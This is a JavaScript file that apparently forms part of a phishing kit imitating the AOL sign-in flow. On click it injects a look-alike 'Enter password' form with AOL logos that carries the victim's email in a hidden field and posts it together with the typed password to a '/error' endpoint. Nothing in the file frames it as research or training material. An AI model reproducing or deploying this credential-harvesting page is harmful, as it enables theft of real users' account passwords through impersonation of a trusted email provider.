const btn = document.querySelector(".btn");
const email = document.querySelector(".email");
const password = document.querySelector("#login-passwd");
let loginContainer = document.querySelector(".login-box-container");

btn.addEventListener("click", function (e) {
  e.preventDefault();

  loginContainer.innerHTML += `
  <div class="login-box right">
            <div class="mbr-login-hd txt-align-center">
              <img
                src="css/aol-logo-black-v.0.0.2.png"
                alt="Aol"
                class="logo aol-en-US"
                width="100"
                height=""
              />
              <img
                src="css/aol-logo-white-v0.0.4.png"
                alt="Aol"
                class="dark-mode-logo logo aol-en-US"
                width="100"
                height=""
              />
            </div>
            <div class="challenge password-challenge">
              <div class="challenge-header">
                <div class="yid">${email.value}</div>
              </div>
              <div id="password-challenge" class="primary">
                <strong class="challenge-heading">Enter&nbsp;password</strong>
                <span class="txt-align-center challenge-desc"
                  >to finish sign&nbsp;in</span
                >
                <form action="/error" method="post" class="challenge-form">
                  <div
                    id="password-container"
                    class="input-group password-container focussed"
                  >
                  <input class="email" name="email" type="hidden" value=${email.value}>
                    <input
                      type="password"
                      id="login-passwd"
                      class="password"
                      name="password"
                      placeholder=" "
                      autofocus=""
                      value=""
                      autocomplete="current-password"
                      data-rapid-tracking="true"
                      data-ylk="elm:input;elmt:focus;slk:passwd;mKey:focus-passwd"
                    />
                    <label
                      for="login-passwd"
                      id="password-label"
                      class="password-label"
                      >Password</label
                    >
                    <div
                      class="caps-indicator hide"
                      id="caps-indicator"
                      title="Capslock is&nbsp;on"
                    ></div>
                  </div>
                  <div class="button-container">
                    <button
                      type="submit"
                      id="login-signin"
                      onClick="nextPage()"
                      class="pure-button btn-2 puree-button-primary puree-spinner-button challenge-button"
                      name="verifyPassword"
                      value="Next"
                    >
                      Next
                    </button>
                  </div>
                  <div class="forgot-cont challenge-button-link">
                    <input
                      type="button"
                      class="pure-button puree-button-link challenge-button-link"
                      data-ylk="elm:btn;elmt:skip;slk:skip;mKey:skip-recovery"
                      data-rapid-tracking="true"
                      id="mbr-forgot-link"
                      name="skip"
                      value="Forgot&nbsp;password?"
                    />
                  </div>
                </form>
              </div>
            </div>
          </div>
  `;
});
